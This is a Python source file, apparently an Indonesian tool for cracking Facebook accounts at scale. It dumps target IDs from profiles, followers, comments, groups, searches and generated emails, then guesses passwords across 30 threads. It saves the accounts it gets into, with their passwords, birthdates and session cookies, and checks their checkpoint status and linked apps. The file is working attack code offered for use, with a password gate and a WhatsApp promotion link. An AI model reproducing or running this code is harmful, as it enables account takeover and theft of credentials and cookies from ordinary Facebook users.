...
╠───{O}github : ARS-07
╠───{H}WhatsApp : 083*****
╠───{H} Group WhatsApp : https://chat.whatsapp.com/FtELiuIlWlb9a4ftxieDLO {P}""")
def logo2():
	return str(f"""
{M} █████╗ ██████╗ ███████╗       ██████╗ ███████╗
{M}██╔══██╗██╔══██╗██╔════╝      ██╔═████╗╚════██║
...
print("║╔═╗║║║╚╣╚═╝║──║╚═╝║─║║─")
print("╚╝─╚╩╝╚═╩═══╝──╚═══╝─╚╝─ ")
input("\n\033[95m[\033[97m?\033[95m] \033[97mEnter Nama Lu \033[97m:\033[92m ")
Password = "ARS-07"
loop = 'true'
while (loop == 'true'):
    passcode = input("\033[1;95m[\033[97m?\033[95m] \033[92mPassword Tools ini\033[97m:\033[92m")
    if (passcode == Password):
            loop = 'false'
    else:
            exit("Pasword mu salah Bego kontol 😎")
os.system('xdg-open wa.me/6283154942624')	
###---[ TANGGAL ]---###
...
def menu(n,t,c):
	clear_layar()
	print(logo(n)+f'\n')
	print('\033[95m╠────────────────────── \x1b[1;91m•\033[93m•\033[32m•\033[32mSTATUS FREE\033[95m\033[32m•\033[93m•\x1b[1;91m• \033[95m────────────────────────────────────╣')
	print(f"\033[95m╠───{U}[{hh}01{O}] CRACK PUBLIK     [{hh}07{O}] CRACK DARI PENCARIAN")
	print(f"\033[95m╠───[{hh}02{O}] CRACK MASSAL     [{hh}08{O}] CRACK DARI FILE")
	print(f"\033[95m╠───[{hh}03{O}] CRACK FOLLOW     [{hh}09{O}] HASIL CRACK")
	print(f"\033[95m╠───[{hh}04{O}] CRACK COMENT     [{hh}10{O}] CEK AKUN NON-AKTIF")
	print(f"\033[95m╠───[{hh}05{O}] CRACK GROUP      [{hh}11{O}] CEK OPSI CHECKPOINT")
	print(f"\033[95m╠───[{hh}06{O}] CRACK EMAIL      [{hh}12{O}] LOGOUT ({M}HAPUS COOKIE{P})")
	print('\033[95m╠──────────────────────────────────────────────────────────────────────────────╣')
	ask = input(f'\033[95m╠───[{hh}>{P}] PILIH MENU : ')
	print('\033[95m╠──────────────────────────────────────────────────────────────────────────────╣')
	...
	elif ask in ['',' ',]:sys.exit(f" [{hh}!{M}] ISI YANG BENAR ASU")
	else:sys.exit(f" [{hh}!{M}] ISI YANG BENAR ASU")
...
def cek_akun():
	...
	xxx = input('\033[95m╠───[{hh}>{O}] Simpan Akun Tidak Kenon Ke File Apa : \n\033[95m╠───[{hh}>{P}] Nama : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	print('\033[95m╠──────────────────────────────────────────────────────────────────────────────╣')
...
def cek_hasil():
	no,nom = 0,[]
	one = input(f'\033[95m╠───[{hh}1{H}] Cek Hasil Akun Ok\n\033[95m╠───[{hh}2{K}] Cek Hasil Akun Cp\n\033[95m╠───[{hh}!{P}] Pilih Menu : ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f"\033[95m╠───[{M}>{H}] Tidak Ada Hasil Ok")
		for x in ok:
			...
			print(f'\033[95m╠───[{hh}{no}{P}] {x} - {hh}{len(jum)} {P}Akun')	
		abc = input(f'\033[95m╠───[{hh}<{O}] Nomor File : ')
		file = nom[int(abc)-1]
		try:buka = open('OK/'+file,'r').read()
		except:sys.exit(f"\033[95m╠───[{M}>{H}] File Tidak Ada Hasil Ok")
		print(hh+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		except:sys.exit(f"\033[95m╠───[{M}>{K}] Tidak Ada Hasil Cp")
		...
		except:sys.exit(f"\033[95m╠───[{M}>{K}] File Tidak Ada Hasil Cp")
		print(kk+buka+P)
	else:sys.exit(f"\033[95m╠───[{M}>{M}] Isi Yang Benar")
		
		
###---[ DUMP NO LOGIN ]---###
def crack_nomor():
	print(f' [{hh}<{O}] crack nomor gunakan sandi manual')
	depan = input(' awalan : ')
	if len(depan)==3:pass
	else:exit(f' [{M}>{O}] contoh awalan nomor 089')
	jumla = input(' jumlah : ')
...
def clon_email():
	...
	global ok , cp
	print(f'\033[95m╠───[{hh}!{O}] Dump Dari Email, Max 5000 ID')
	nama = input(f'\033[95m╠───[{hh}!{O}] Masukkan Nama Target : ')
	if ',' in str(nama):
		exit(f'\033[95m╠───[{hh}!{U}] Masukkan 1 Nama Saja')
	print(f'\033[95m╠───[{hh}!{H}] Contoh Domain: @gmail.com,@yahoo.com')
	doma = input(f'\033[95m╠───[{hh}!{H}] Masukkan Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'\033[95m╠───[{hh}!{M}] Masukan Domain Yang Benar')
	jumlah = input(f'\033[95m╠───[{hh}!{O}] Mau Berapa Target Max 5000  : ')
	for xyz in range(int(jumlah)):
		...
		print('\r\033[95m╠───[{hh}!{O}] Sedang Dump %s Id'%(len(dump)),end='')
		sys.stdout.flush()
	atur_atur()	

def crack_file():
	file = input(f'\033[95m╠───[{hh}!{O}] Masukan Nama File Dump\n\033[95m╠───[{hh}!{O}] File : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f"\033[95m╠───[{hh}!{M}] Pemisah Salah")
			dump.append(data)
			print('\r\033[95m╠───[{hh}!{O}] Sedang Dump %s ID'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:exit(f"\033[95m╠───[{hh}!{M}] File Tidak Ada")
	print(f'\r\033[95m╠───[{hh}!{H}] Total Jumlah Akun Adalah {len(dump)}')
	atur_atur()
...
def crack_search():
	...
	print(f'\033[95m╠───[{hh}!{O}] 1 NAMA SETARA DENGAN 10K AKUN')
	nam = input(f'\033[95m╠───[{hh}!{O}] Masukkan Nama : ').split(",")
	for ser in nam:		
...
def crack_komen():
	ide = input(f'\033[95m╠───[{hh}<{U}] Masukan Id Postingan Target\n\033[95m╠───[{hh}!{O}] Id Post : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f'\033[95m╠───[{hh}!{M}] Gagal Dump Komen')
	atur_atur()
...
def get_komen(url):
	...
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			...
			print(f'\r\033[95m╠───[{hh}!{O}] Sedang Dump {len(dump)} ID Com ',end='');sys.stdout.flush()
...
def crack_publik(t,c):
	akun = input(f'\033[95m╠───[{hh}!{O}] PASTIKAN ID TARGET BERSIFAT PUBLIK \n\033[95m╠───[{hh}!{O}] MASUKKAN ID : ')
	try:
		...
		exit(f"╠───[{hh}!{M}] AKUN TIDAK PUBLIK")	


def crack_masal(t,c):
    print(f'\033[95m╠───[{hh}!{M}] PASTIKAN ID TARGET BERSIFAT PUBLIK ')
    try:
        bz=0
        apa = int(input(f'\033[95m╠───[{hh}!{O}] Mau Berapa Target Asu : '))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r\033[95m╠───[{hh}!{O}] Masukkan Id Ke {bz} : ')
    	try:
    		...
    		print(f"\r\033[95m╠───[{hh}!{M}] AKUN TIDAK PUBLIK       ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(t,c):
	akun = input(f'\033[95m╠───[{hh}<{O}] Pastikan Akun Bersifat Publik \n\033[95m╠───[{hh}!{O}] ID Akun Target : ')
	try:
		...
		for pi in bas["subscribers"]["data"]:
			try:
				...
				print('\r\033[95m╠───[{hh}!{O}] Sedang Dump %s ID Foll'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f"\033[95m╠───[{M}>{O}] Akun Tidak Publik")
		
def crack_group():
	link = input(f'\033[95m╠───[{hh}<{O}] Pastikan Group Bersifat Publik \n\033[95m╠───[{hh}!{P}] Masukkan Id Grup : ')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f'\033[95m╠───[{M}>{O}] Gagal Dump Group')
	atur_atur()
	...
	try:
		...
		for x in data.find_all("table"):
			...
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				...
				print(f'\r\033[95m╠───[{hh}!{O}] Sedang Dump {len(dump)} ID Grup ',end='');sys.stdout.flush()
...
def atur_atur():
	print(f"\r{U}╠────────────────────────────────────────────────────────────────╣")
	ro = input(f'╠───[{hh}1{O}].Mobile \n\033[95m╠───[{hh}2{O}].Mbasic \n\033[95m \n\033[95m╠───[{hh}3{O}].free \n\033[95m╠───[{hh}?{O}].Pilih Metode : ')
	...
	print(f"\r{U}╠────────────────────────────────────────────────────────────────╣")
	ch = input(f'\033[95m╠───[{hh}1{O}]. Akun Tertua \n\033[95m╠───[{hh}2{O}]. Akun Terbaru \n\033[95m╠───[{hh}3{O}]. Akun Random\n\033[95m╠───[{hh}?{O}]. Pilih Metode Akun : ')
	if ch in ['1','01']:
		for x in dump:
			id.append(x)
	elif ch in ['2','02']:
		...
		for x in dump:
			id.append(x)
	print(f"\r{U}╠────────────────────────────────────────────────────────────────╣")
	cp = input(f'\033[95m╠───[{hh}!{K}] Tampilkan Opsi CP [Ya/no]\n\033[95m╠───[{hh}?{O}]. Pilih : ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"\r{U}╠────────────────────────────────────────────────────────────────╣")
	apk = input(f'\033[95m╠───[{hh}!{H}] Tampilkan Info Aplikasi [Ya/no]\n\033[95m╠───[{hh}?{O}]. Pilih : ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(f"\r{U}╠────────────────────────────────────────────────────────────────╣")
	ch = input(f'\033[95m╠───[{hh}1{P}]. Pw Manual \n\033[95m╠───[{hh}2{P}]. Pw Gabung \n\033[95m╠───[{hh}3{P}]. Pw Otomatis\n\033[95m╠───[{hh}?{O}]. Pilih Sandi  : ')
...
def manual():
	...
	pwx = []
	print('\033[95m╠──────────────────────────────────────────────────────────────────────────────╣')
	B = input(f'\033[95m╠───[{hh}!{P}] Input Sandi Manual 6 Kata\n\033[95m╠───[{hh}!{P}] Sandi  : ').split(',')
	for x in B:
		pwx.append(x)
	print(f"{U} ─────────────────────────────")
	print(f'\033[95m╠───[{hh}!{H}] Akun OK Di {sim_ok}\n\033[95m╠───[{hh}!{K}] Akun Cp Di : {sim_cp}')
	print('\033[95m╠──────────────────────────────────────────────────────────────────────────────╣')
	awal = datetime.now()
...
def gabung():
	...
	print('\033[95m╠──────────────────────────────────────────────────────────────────────────────╣')
	B = input(f'\033[95m╠───[{hh}!{P}] Input Sandi Manual 6 Kata\n\033[95m╠───[{hh}!{P}] Sandi  : ').split(',')
	C = input(f'\033[95m╠───[{hh}!{P}] Input Sandi Belakang Nama\n\033[95m╠───[{hh}!{P}] Sandi  : ')
	if ',' in str(C):
		exit(f"\033[95m╠───[{hh}!{P}] Sandi Belakang Satu Kata Saja")
	print('\033[95m╠──────────────────────────────────────────────────────────────────────────────╣')
	print(f'\033[95m╠───[{hh}!{H}] Akun OK Di : {sim_ok}\n\033[95m╠───[{hh}!{K}] Akun CP Di : {sim_cp}')
	print('\033[95m╠──────────────────────────────────────────────────────────────────────────────╣')
	awal = datetime.now()
...
def otomatis():
	global ok,cp
	print('\033[95m╠──────────────────────────────────────────────────────────────────────────────╣')
	print(f'\033[95m╠───[{hh}!{P}] {hh}HASIL Ok Di Simpan Di : {sim_ok}{U}\n╠───[{hh}!{P}] {K}HASIL Cp Di Simpan Di : {sim_cp}{P}')
	print('\033[95m╠──────────────────────────────────────────────────────────────────────────────╣')
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
...
def crack(idf,pwx,url,awal):
	...
	print(f"\r\033[95m [{hh}Vin-XD{U}]\33[1;96m[ {ahir} ]\033[95m [%s/%s]\033[32m OK:-[ %s ]\033[93m CP:-[ %s ]"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
				...
				if data in rescp:pass
					...
					if 'ya' in cepeh:
						...
						try:
							...
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r\033[95m╠───[{kk}>{P}] Email  : {kk}{idf}{U}          \n╠───[{kk}>{P}] Sandi  : {kk}{pw}          {U}\n╠───[{kk}>{P}] Lahir  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+sim_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\n\033[95m╠───[{kk}>{P}] Email  : {kk}{idf}{U}          \n╠───[{kk}>{P}] Sandi  : {kk}{pw}          {P}\n')
...
def cek_opsi(idf,pw,ua):
	...
	try:
		...
		day = ""
		year = ""
		akun += f'\033[95m╠───[{kk}>{P}] Email  : {kk}{idf}{U}          \n╠───[{kk}>{P}] Sandi  : {kk}{pw}          {U}\n╠───[{kk}>{P}] User-Agent : {ua}     {P}'
		if 'file' in detek:pass
	...
	try:
		...
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f'\n\033[95m╠───[{hh}>{P}] {hh}Hore Akun Tap Yes🎉{P}                       '
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f' [{kk}>{P}] Akun Terpasang Auten😭                     '
				else:
					cok = convert(ses.cookies.get_dict())
					akun += f' [{hh}>{P}] Akun Tidak Checkpoint🤑                       \n╠───[{hh}>{P}] Cookie : {cok}'
			else:
		...
		akun += f'\n\033[95m╠───[{M}>{P}] Kata Sandi Salah / Spam🗿                      '
	print('\r'+ akun)
	print('\r                                                                       ')
...
def cek_apk(idf,pw,kuki):
	...
	if len(apk1)==0:pass
		...
		akun = (f'\033[95m╠───[{hh}>{O}] Aplikasi Ditambahkan :                     ')
		no = 0
		for apk in apk1:
			no += 1
			akun += (f'\n\033[95m╠───{P}[{hh}{no}{P}] {hh}{apk.lower()}            ')
		print('\r'+akun)
	if len(apk2)==0:pass
	else:
		akun = (f'\033[95m╠───{P}[{kk}>{M}] Aplikasi Kadaluwarsa :                   ')
		no = 0
		for apk in apk2:
			no += 1
			akun += (f'\n\033[95m╠───{P}[{kk}{no}{O}] {kk}{apk.lower()}             ')
		print('\r'+akun)
	if len(apk3)==0:pass
	else:
		akun = (f'\033[95m╠───{P}[{M}>{O}] Aplikasi Yang Dihapus :                  ')
		no = 0
		for apk in apk3:
			no += 1
			akun += (f'\n\033[95m╠───{P}[{M}{no}{P}] {M}{apk.lower()}               ')
		print('\r'+akun)
	apk1.clear()
	apk2.clear()
	apk3.clear()
